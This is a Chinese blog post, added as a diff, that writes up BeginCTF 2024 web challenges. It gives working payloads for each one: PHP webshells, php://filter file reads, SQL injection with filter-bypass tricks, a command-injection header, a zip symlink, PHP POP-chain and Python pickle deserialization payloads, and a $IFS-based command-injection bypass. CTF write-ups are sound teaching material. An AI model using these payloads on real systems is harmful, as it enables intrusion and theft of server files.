@@ -1,0 +1,593 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="作者：Narcher	时间：2024&#x2F;2&#x2F;3	分类：writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BeginCTF2024_WEB_WP">
+<meta property="og:url" content="http://example.com/2024/02/07/BeginCTF2024_WEB_WP/index.html">
+<meta property="og:site_name" content="Narcherの小窝">
+<meta property="og:description" content="作者：Narcher	时间：2024&#x2F;2&#x2F;3	分类：writeup">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2024/02/07/BeginCTF2024_WEB_WP/1706964110449.png">
+<meta property="og:image" content="http://example.com/2024/02/07/BeginCTF2024_WEB_WP/1706964226317.png">
+<meta property="og:image" content="http://example.com/2024/02/07/BeginCTF2024_WEB_WP/1706964316902.png">
+<meta property="og:image" content="http://example.com/2024/02/07/BeginCTF2024_WEB_WP/1706964602559.png">
+<meta property="og:image" content="http://example.com/2024/02/07/BeginCTF2024_WEB_WP/1706964695540.png">
+<meta property="og:image" content="http://example.com/2024/02/07/BeginCTF2024_WEB_WP/1706964975687.png">
+<meta property="og:image" content="http://example.com/2024/02/07/BeginCTF2024_WEB_WP/1706965143957.png">
+<meta property="og:image" content="http://example.com/2024/02/07/BeginCTF2024_WEB_WP/1706965351433.png">
+<meta property="og:image" content="http://example.com/2024/02/07/BeginCTF2024_WEB_WP/1706965937251.png">
+<meta property="og:image" content="http://example.com/2024/02/07/BeginCTF2024_WEB_WP/1706966299795.png">
+<meta property="og:image" content="http://example.com/2024/02/07/BeginCTF2024_WEB_WP/1706966698425.png">
+<meta property="og:image" content="http://example.com/2024/02/07/BeginCTF2024_WEB_WP/1706966860374.png">
+<meta property="og:image" content="http://example.com/2024/02/07/BeginCTF2024_WEB_WP/1706967332988.png">
+<meta property="og:image" content="http://example.com/2024/02/07/BeginCTF2024_WEB_WP/1706967424563.png">
+<meta property="og:image" content="http://example.com/2024/02/07/BeginCTF2024_WEB_WP/1706967939016.png">
+<meta property="og:image" content="http://example.com/2024/02/07/BeginCTF2024_WEB_WP/1706968229837.png">
+<meta property="og:image" content="http://example.com/2024/02/07/BeginCTF2024_WEB_WP/1706968754680.png">
+<meta property="article:published_time" content="2024-02-07T03:20:54.991Z">
+<meta property="article:modified_time" content="2024-02-07T03:20:32.243Z">
+<meta property="article:author" content="Narcher Alter">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2024/02/07/BeginCTF2024_WEB_WP/1706964110449.png">
+
+<link rel="canonical" href="http://example.com/2024/02/07/BeginCTF2024_WEB_WP/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>BeginCTF2024_WEB_WP | Narcherの小窝</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Narcherの小窝</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/02/07/BeginCTF2024_WEB_WP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Narcher Alter">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Narcherの小窝">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          BeginCTF2024_WEB_WP
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2024-02-07 11:20:54 / Modified: 11:20:32" itemprop="dateCreated datePublished" datetime="2024-02-07T11:20:54+08:00">2024-02-07</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><em>作者：Narcher</em>	<em>时间：2024&#x2F;2&#x2F;3</em>	<em>分类：writeup</em></p>
+<span id="more"></span>
+
+<h2 id="zupload系列"><a href="#zupload系列" class="headerlink" title="zupload系列"></a>zupload系列</h2><p>1.这一系列的题目基本上都是考察简单的代码审计，论难度只能算是签到题。</p>
+<p>2.所有题目均会先贴出源码。</p>
+<h3 id="zupload"><a href="#zupload" class="headerlink" title="zupload"></a>zupload</h3><img src="/2024/02/07/BeginCTF2024_WEB_WP/1706964110449.png" alt="1706964110449" style="zoom:67%;">
+
+<p>本题对action的赋值无过滤，因此可直接读flag，payload:<code>?action=/flag</code></p>
+<img src="/2024/02/07/BeginCTF2024_WEB_WP/1706964226317.png" alt="1706964226317" style="zoom:67%;">
+
+
+
+<h3 id="zupload-pro"><a href="#zupload-pro" class="headerlink" title="zupload-pro"></a>zupload-pro</h3><img src="/2024/02/07/BeginCTF2024_WEB_WP/1706964316902.png" alt="1706964316902" style="zoom: 50%;">
+
+<p>本题禁止了目录穿越，但限制条件不多，可直接用php伪协议读取文件。</p>
+<p>payload:<code>?action=php://filter/convert.base64-encode/resource=/flag</code></p>
+<img src="/2024/02/07/BeginCTF2024_WEB_WP/1706964602559.png" alt="1706964602559" style="zoom:80%;">
+
+<p>base64解码即可：begin{is_tHis_4_wE85heLL_069b22e704f1}</p>
+<h3 id="zupload-pro-plus"><a href="#zupload-pro-plus" class="headerlink" title="zupload-pro-plus"></a>zupload-pro-plus</h3><img src="/2024/02/07/BeginCTF2024_WEB_WP/1706964695540.png" alt="1706964695540" style="zoom: 50%;">
+
+<p>本题做法同上，payload:<code>?action=php://filter/convert.base64-encode/resource=/flag</code></p>
+<p>从源码改动上来看，出题人应该是想让选手进行后缀双写绕过，但应该是出题的时候不严谨，导致有多种做法，因此不再过多赘述</p>
+<h3 id="zupload-pro-plus-enhanced"><a href="#zupload-pro-plus-enhanced" class="headerlink" title="zupload-pro-plus-enhanced"></a>zupload-pro-plus-enhanced</h3><img src="/2024/02/07/BeginCTF2024_WEB_WP/1706964975687.png" alt="1706964975687" style="zoom:50%;">
+
+<p>作者在本题进行了加固，只能进行双写后缀的形式绕过</p>
+<p>方法如下：</p>
+<p>1.一句话木马<code>&lt;?php @eval(system(&#39;cat /flag&#39;))?&gt;</code>写入1.php<br>2.改后缀名为1.zip<br>3.上传时拦截数据包改名为1.zip.php<br>4.访问<code>http://ip:port/uploads/1.zip.php</code></p>
+<h3 id="zupload-pro-plus-max"><a href="#zupload-pro-plus-max" class="headerlink" title="zupload-pro-plus-max"></a>zupload-pro-plus-max</h3><img src="/2024/02/07/BeginCTF2024_WEB_WP/1706965143957.png" alt="1706965143957" style="zoom:50%;">
+
+<p>本题考点：include()函数包含文件时不考虑文件后缀，并且会将文件内容当作php代码执行</p>
+<p>方法如下：</p>
+<p>1.创建1.txt里边写上php一句话木马<code>&lt;?php eval(system(&quot;cat /flag&quot;));?&gt;</code><br>2.压缩为1.zip上传<br>3.访问uploads&#x2F;1.zip，include()函数自动解析1.txt内的内容即可获取&#x2F;flag</p>
+<h3 id="zupload-pro-plus-max-ultra"><a href="#zupload-pro-plus-max-ultra" class="headerlink" title="zupload-pro-plus-max-ultra"></a>zupload-pro-plus-max-ultra</h3><img src="/2024/02/07/BeginCTF2024_WEB_WP/1706965351433.png" alt="1706965351433" style="zoom:50%;">
+
+<p>本题考点：$_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由 Web 服务器创建。不能保证每个服务器都提供全部项目；服务器可能会忽略一些，或者提供一些额外的项目。</p>
+<hr>
+<table>
+<thead>
+<tr>
+<th align="left">$_SERVER[‘PHP_SELF’]</th>
+<th>当前执行脚本的文件名，与 document root 有关。例如，在地址为 <a href="http://example.com/test.php/foo.bar">http://example.com/test.php/foo.bar</a> 的脚本中使用 $<em>SERVER[‘PHP_SELF’] 将得到 &#x2F;test.php&#x2F;foo.bar。__FILE</em>_ 常量包含当前(例如包含)文件的完整路径和文件名。 从 PHP 4.3.0 版本开始，如果 PHP 以命令行模式运行，这个变量将包含脚本名。之前的版本该变量不可用。</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">$_SERVER[‘GATEWAY_INTERFACE’]</td>
+<td>服务器使用的 CGI 规范的版本；例如，”CGI&#x2F;1.1”。</td>
+</tr>
+<tr>
+<td align="left">$_SERVER[‘SERVER_ADDR’]</td>
+<td>当前运行脚本所在的服务器的 IP 地址。</td>
+</tr>
+<tr>
+<td align="left">$_SERVER[‘SERVER_NAME’]</td>
+<td>当前运行脚本所在的服务器的主机名。如果脚本运行于虚拟主机中，该名称是由那个虚拟主机所设置的值决定。(如: <a target="_blank" rel="noopener" href="http://www.runoob.com/">www.runoob.com</a>)</td>
+</tr>
+<tr>
+<td align="left">$_SERVER[‘SERVER_SOFTWARE’]</td>
+<td>服务器标识字符串，在响应请求时的头信息中给出。 (如：Apache&#x2F;2.2.24)</td>
+</tr>
+<tr>
+<td align="left">$_SERVER[‘SERVER_PROTOCOL’]</td>
+<td>请求页面时通信协议的名称和版本。例如，”HTTP&#x2F;1.0”。</td>
+</tr>
+<tr>
+<td align="left">$_SERVER[‘REQUEST_METHOD’]</td>
+<td>访问页面使用的请求方法；例如，”GET”, “HEAD”，”POST”，”PUT”。</td>
+</tr>
+<tr>
+<td align="left">$_SERVER[‘REQUEST_TIME’]</td>
+<td>请求开始时的时间戳。从 PHP 5.1.0 起可用。 (如：1377687496)</td>
+</tr>
+<tr>
+<td align="left">$_SERVER[‘QUERY_STRING’]</td>
+<td>query string（查询字符串），如果有的话，通过它进行页面访问。</td>
+</tr>
+<tr>
+<td align="left">$_SERVER[‘HTTP_ACCEPT’]</td>
+<td>当前请求头中 Accept: 项的内容，如果存在的话。</td>
+</tr>
+<tr>
+<td align="left">$_SERVER[‘HTTP_ACCEPT_CHARSET’]</td>
+<td>当前请求头中 Accept-Charset: 项的内容，如果存在的话。例如：”iso-8859-1,*,utf-8”。</td>
+</tr>
+<tr>
+<td align="left">$_SERVER[‘HTTP_HOST’]</td>
+<td>当前请求头中 Host: 项的内容，如果存在的话。</td>
+</tr>
+<tr>
+<td align="left">$_SERVER[‘HTTP_REFERER’]</td>
+<td>引导用户代理到当前页的前一页的地址（如果存在）。由 user agent 设置决定。并不是所有的用户代理都会设置该项，有的还提供了修改 HTTP_REFERER 的功能。简言之，该值并不可信。)</td>
+</tr>
+<tr>
+<td align="left">$_SERVER[‘HTTPS’]</td>
+<td>如果脚本是通过 HTTPS 协议被访问，则被设为一个非空的值。</td>
+</tr>
+<tr>
+<td align="left">$_SERVER[‘REMOTE_ADDR’]</td>
+<td>浏览当前页面的用户的 IP 地址。</td>
+</tr>
+<tr>
+<td align="left">$_SERVER[‘REMOTE_HOST’]</td>
+<td>浏览当前页面的用户的主机名。DNS 反向解析不依赖于用户的 REMOTE_ADDR。</td>
+</tr>
+<tr>
+<td align="left">$_SERVER[‘REMOTE_PORT’]</td>
+<td>用户机器上连接到 Web 服务器所使用的端口号。</td>
+</tr>
+<tr>
+<td align="left">$_SERVER[‘SCRIPT_FILENAME’]</td>
+<td>当前执行脚本的绝对路径。</td>
+</tr>
+<tr>
+<td align="left">$_SERVER[‘SERVER_ADMIN’]</td>
+<td>该值指明了 Apache 服务器配置文件中的 SERVER_ADMIN 参数。如果脚本运行在一个虚拟主机上，则该值是那个虚拟主机的值。(如：<a href="mailto:&#x73;&#x6f;&#x6d;&#101;&#x6f;&#110;&#x65;&#64;&#114;&#117;&#110;&#x6f;&#111;&#x62;&#46;&#x63;&#111;&#x6d;">&#x73;&#x6f;&#x6d;&#101;&#x6f;&#110;&#x65;&#64;&#114;&#117;&#110;&#x6f;&#111;&#x62;&#46;&#x63;&#111;&#x6d;</a>)</td>
+</tr>
+<tr>
+<td align="left">$_SERVER[‘SERVER_PORT’]</td>
+<td>Web 服务器使用的端口。默认值为 “80”。如果使用 SSL 安全连接，则这个值为用户设置的 HTTP 端口。</td>
+</tr>
+<tr>
+<td align="left">$_SERVER[‘SERVER_SIGNATURE’]</td>
+<td>包含了服务器版本和虚拟主机名的字符串。</td>
+</tr>
+<tr>
+<td align="left">$_SERVER[‘PATH_TRANSLATED’]</td>
+<td>当前脚本所在文件系统（非文档根目录）的基本路径。这是在服务器进行虚拟到真实路径的映像后的结果。</td>
+</tr>
+<tr>
+<td align="left">$_SERVER[‘SCRIPT_NAME’]</td>
+<td>包含当前脚本的路径。这在页面需要指向自己时非常有用。<strong>FILE</strong> 常量包含当前脚本(例如包含文件)的完整路径和文件名。</td>
+</tr>
+<tr>
+<td align="left">$_SERVER[‘SCRIPT_URI’]</td>
+<td>URI 用来指定要访问的页面。例如 “&#x2F;index.html”。</td>
+</tr>
+</tbody></table>
+<p>（以上内容均来自菜鸟：<a target="_blank" rel="noopener" href="https://www.runoob.com/php/php-superglobals.html">PHP 超级全局变量 | 菜鸟教程 (runoob.com)</a>）</p>
+<hr>
+<p>方法如下：</p>
+<p>1.burp抓包，在http头中添加X-Extract-To:.;cp &#x2F;flag . &#x2F;uploads&#x2F;</p>
+<p>2.访问<code>http://ip:port/uploads/flag</code></p>
+<h3 id="zupload-pro-plus-max-ultra-premium"><a href="#zupload-pro-plus-max-ultra-premium" class="headerlink" title="zupload-pro-plus-max-ultra-premium"></a>zupload-pro-plus-max-ultra-premium</h3><img src="/2024/02/07/BeginCTF2024_WEB_WP/1706965937251.png" alt="1706965937251" style="zoom:50%;">
+
+<p>本题考点：软链接</p>
+<p>软链接可以看成是Windows系统中的快捷方式，可以让你快速链接到目标文件或目录，它找到的是原文件名，通过原文件名找到真实的文件或目录，且软连接本身有自己的indoe</p>
+<p>方法如下：</p>
+<p>1.ln -s &#x2F;flag flag创建软连接文件</p>
+<p>2.将文件压缩为zip格式上传</p>
+<p>3.访问&#x2F;uploads&#x2F;flag即可访问到&#x2F;flag</p>
+<h3 id="zupload-pro-revenge"><a href="#zupload-pro-revenge" class="headerlink" title="zupload-pro-revenge"></a>zupload-pro-revenge</h3><img src="/2024/02/07/BeginCTF2024_WEB_WP/1706966299795.png" alt="1706966299795" style="zoom:50%;">
+
+<p>本题考点：前端校验绕过（PS：任何前端校验都是不可信的）</p>
+<p>方法如下：</p>
+<p>1.一句话木马<code>&lt;?php @eval(system(&#39;cat /flag&#39;))?&gt;</code>写入1.php<br>2.改后缀名为1.zip<br>3.上传时拦截数据包改名为1.php<br>4.访问<code>http://ip:port/uploads/1.php</code></p>
+<h2 id="sql教学局"><a href="#sql教学局" class="headerlink" title="sql教学局"></a>sql教学局</h2><p>单纯的sql waf绕过，没什么技术含量</p>
+<p>flag分为三部分，依次拿就是了</p>
+<img src="/2024/02/07/BeginCTF2024_WEB_WP/1706966698425.png" alt="1706966698425" style="zoom: 67%;">
+
+<p>payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.http://ip:port/challenge.php?user=1%27/**/union/**/seselectlect/**/group_concat(flag)/**/frfromom/**/secret.passwoorrd%23</span><br><span class="line">2.http://ip:port/challenge.php?user=1%27/**/union/**/seselectlect/**/group_concat(student,%27~%27,grade)/**/frfromom/**/scoorre/**/where/**/student/**/like/**/%27begin%27%23</span><br><span class="line">3.http://ip:port/challenge.php?user=1%27/**/union/**/seselectlect/**/loloadad_file(&#x27;/flag&#x27;)%23</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="POPgadget"><a href="#POPgadget" class="headerlink" title="POPgadget"></a>POPgadget</h2><p>考察php反序列化，这个题目有点坑人，flag在环境变量中，直接看phpinfo就可以了，耗费了很多时间</p>
+<img src="/2024/02/07/BeginCTF2024_WEB_WP/1706966860374.png" alt="1706966860374" style="zoom:50%;">
+
+<p>POP链构造：B::__destruct到A::__get到Fun::__call</p>
+<img src="/2024/02/07/BeginCTF2024_WEB_WP/1706967332988.png" alt="1706967332988" style="zoom:50%;">
+
+<p>别忘了将空字符改成%00，之后GET传参：<code>?begin=O:1:&quot;B&quot;:2:&#123;s:1:&quot;p&quot;;s:7:&quot;phpinfo&quot;;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;Fun&quot;:1:&#123;s:9:&quot;%00Fun%00func&quot;;s:20:&quot;call_user_func_array&quot;;&#125;&#125;&#125;</code></p>
+<img src="/2024/02/07/BeginCTF2024_WEB_WP/1706967424563.png" alt="1706967424563" style="zoom:50%;">
+
+<p>PS：后来才知道，这个phpinfo是个非预期，真正的解法实际上是把phpinfo改成env直接看环境变量（其实也差不多）</p>
+<h2 id="pickelshop"><a href="#pickelshop" class="headerlink" title="pickelshop"></a>pickelshop</h2><p>新知识点：考察pickel反序列化</p>
+<p>register页面注册获取cookie，在login页面的http头中添加cookie会发现回显</p>
+<p>因此在username中添加__reduce__函数进行命令执行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">register</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, username=<span class="string">&quot;test&quot;</span></span>):</span><br><span class="line">        self.username = username</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">      <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = &#123;<span class="string">&#x27;username&#x27;</span>: register(), <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;124&#x27;</span>&#125;</span><br><span class="line">c = pickle.dumps(a, protocol=<span class="number">4</span>)</span><br><span class="line">encoded_data = base64.b64encode(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将base64字符串写入Output.txt文件中</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(encoded_data)</span><br></pre></td></tr></table></figure>
+
+<p>之后改Cookie即可</p>
+<img src="/2024/02/07/BeginCTF2024_WEB_WP/1706967939016.png" alt="1706967939016" style="zoom:50%;">
+
+
+
+<h2 id="readbooks"><a href="#readbooks" class="headerlink" title="readbooks"></a>readbooks</h2><p>本题考点：命令执行</p>
+<p>&#x2F;public&#x2F;book*发现同时列出来了book1和book2的内容</p>
+<p>因此直接&#x2F;list&#x2F;*获取当前目录所有文件名</p>
+<img src="/2024/02/07/BeginCTF2024_WEB_WP/1706968229837.png" alt="1706968229837" style="zoom:50%;">
+
+<p>再用&#x2F;public&#x2F;black*获取黑名单，&#x2F;public&#x2F;app*获取源码</p>
+<p>源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">from flask import Flask, request, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">DISALLOWED1 = [&#x27;?&#x27;, &#x27;../&#x27;, &#x27;/&#x27;, &#x27;;&#x27;, &#x27;!&#x27;, &#x27;@&#x27;, &#x27;#&#x27;, &#x27;^&#x27;, &#x27;&amp;&#x27;, &#x27;(&#x27;, &#x27;)&#x27;, &#x27;=&#x27;, &#x27;+&#x27;]</span><br><span class="line">DISALLOWED_FILES = [&#x27;app.py&#x27;, &#x27;templates&#x27;, &#x27;etc&#x27;, &#x27;flag&#x27;, &#x27;blacklist&#x27;]</span><br><span class="line">BLACKLIST = [x[:-1] for x in open(&quot;./blacklist.txt&quot;).readlines()][:-1]</span><br><span class="line"></span><br><span class="line">BLACKLIST.append(&quot;/&quot;)</span><br><span class="line">BLACKLIST.append(&quot;\\&quot;)</span><br><span class="line">BLACKLIST.append(&quot; &quot;)</span><br><span class="line">BLACKLIST.append(&quot;\t&quot;)</span><br><span class="line">BLACKLIST.append(&quot;\n&quot;)</span><br><span class="line">BLACKLIST.append(&quot;tc&quot;)</span><br><span class="line"></span><br><span class="line">ALLOW = [</span><br><span class="line">    &quot;&#123;&quot;,</span><br><span class="line">    &quot;&#125;&quot;,</span><br><span class="line">    &quot;[&quot;,</span><br><span class="line">    &quot;pwd&quot;,</span><br><span class="line">    &quot;-&quot;,</span><br><span class="line">    &quot;_&quot;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">for a in ALLOW:</span><br><span class="line">    try:</span><br><span class="line">        BLACKLIST.remove(a)</span><br><span class="line">    except ValueError:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">@app.route(&#x27;/index&#x27;)</span><br><span class="line">def hello_world():</span><br><span class="line">    return render_template(&#x27;index.html&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/public/&lt;path:name&gt;&#x27;)</span><br><span class="line">def readbook(name):</span><br><span class="line">    name = str(name)</span><br><span class="line">    for i in DISALLOWED1:</span><br><span class="line">        if i in name:</span><br><span class="line">            return &quot;banned!&quot;</span><br><span class="line">    for j in DISALLOWED_FILES:</span><br><span class="line">        if j in name:</span><br><span class="line">            return &quot;banned!&quot;</span><br><span class="line">    for k in BLACKLIST:</span><br><span class="line">        if k in name:</span><br><span class="line">            return &quot;banned!&quot;</span><br><span class="line">    print(name)</span><br><span class="line">    try:</span><br><span class="line">        res = os.popen(&#x27;cat &#123;&#125;&#x27;.format(name)).read()</span><br><span class="line">        return res</span><br><span class="line">    except:</span><br><span class="line">        return &quot;error&quot;</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/list/&lt;path:name&gt;&#x27;)</span><br><span class="line">def listbook(name):</span><br><span class="line">    name = str(name)</span><br><span class="line">    for i in DISALLOWED1:</span><br><span class="line">        if i in name:</span><br><span class="line">            return &quot;banned!&quot;</span><br><span class="line">    for j in DISALLOWED_FILES:</span><br><span class="line">        if j in name:</span><br><span class="line">            return &quot;banned!&quot;</span><br><span class="line">    for k in BLACKLIST:</span><br><span class="line">        if k in name:</span><br><span class="line">            return &quot;banned!&quot;</span><br><span class="line">    print(name)</span><br><span class="line">    cmd = &#x27;ls &#123;&#125;&#x27;.format(name)</span><br><span class="line">    try:</span><br><span class="line">        res = os.popen(cmd).read()</span><br><span class="line">        return res</span><br><span class="line">    except:</span><br><span class="line">        return &quot;error&quot;</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;,port=8878)</span><br></pre></td></tr></table></figure>
+
+<p>黑名单过滤了许多，因此需要绕过</p>
+<p>空格用$IFS$9代替，关键字使用&#39;&#39;绕过，执行的命令进行base64转换</p>
+<p>payload: &#x2F;public&#x2F;$IFS$9`ec’’ho$IFS$9Lyo|ba’’se64$IFS$9-d`</p>
+<p>读取根目录下所有文件</p>
+<img src="/2024/02/07/BeginCTF2024_WEB_WP/1706968754680.png" alt="1706968754680" style="zoom:50%;">
+
+
+
+<h2 id="King"><a href="#King" class="headerlink" title="King"></a>King</h2><p>本题参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/Jayjay___/article/details/136052251">beginCTF 2024 Web方向题解WP 全-CSDN博客</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/02/05/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98/" rel="prev" title="记一次简单的公益SRC挖掘">
+      <i class="fa fa-chevron-left"></i> 记一次简单的公益SRC挖掘
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
